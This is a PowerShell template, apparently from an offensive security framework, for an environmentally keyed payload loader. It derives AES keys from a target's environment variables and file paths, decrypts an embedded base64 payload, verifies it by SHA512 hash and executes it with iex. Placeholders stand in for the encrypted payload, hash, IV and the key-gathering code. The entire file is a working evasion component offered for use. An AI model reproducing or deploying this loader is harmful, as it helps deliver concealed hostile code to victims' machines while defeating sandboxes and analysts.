function Get-Environmental
{
    function Get-SHA512Hash {
        param($b)
        return [System.BitConverter]::ToString($script:sha512.ComputeHash($e.getbytes($b))).ToLower() -replace "-",""
    }
    function Compare-SHA512Hashes {
        param($a)
        $end = $a.Length - ~MINUSBYTES~ - 1
        if((Get-SHA512Hash $($a[0..$end] -join "")) -eq "~PAYLOADHASH~") {
            return $true
        }
        else { return $false }
    }
    function Get-AESDecrypted {
        param($b)
        $e=[System.Text.Encoding]::ASCII
        $bytes=[System.Convert]::FromBase64String("~ENCRYPTEDBASE64~")
        try {
            $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
        }
        catch {
            $AES=New-Object System.Security.Cryptography.RijndaelManaged;
        }
        $AES.Mode = "CBC";
        $AES.Key = $e.GetBytes((Get-SHA512Hash $b)[0..31] -join "")
        $AES.IV = [System.Convert]::FromBase64String("~AESIVBASE64~")
        try {
            $decrypted = $AES.CreateDecryptor().TransformFinalBlock($bytes, 0, $bytes.Length)
        }
        catch { return }
        $result = $e.GetString($decrypted)
        if(Compare-SHA512Hashes $result) {
            iex($result)
            break
        }

    }
    function Test-Inputs {
        param($a,$b)
        $a | ForEach-Object {
            $key = "$_$b"
            Get-AESDecrypted $key.ToLower()
        }
    }
    $script:sha512 = New-Object System.Security.Cryptography.SHA512CryptoServiceProvider
    $allPaths = @("")
    $envCombos = @("")
    
    
    ~WALKOS~
    ~ENVVAR~

    $allPaths | ForEach-Object {
        Test-Inputs $envCombos $_
    }
}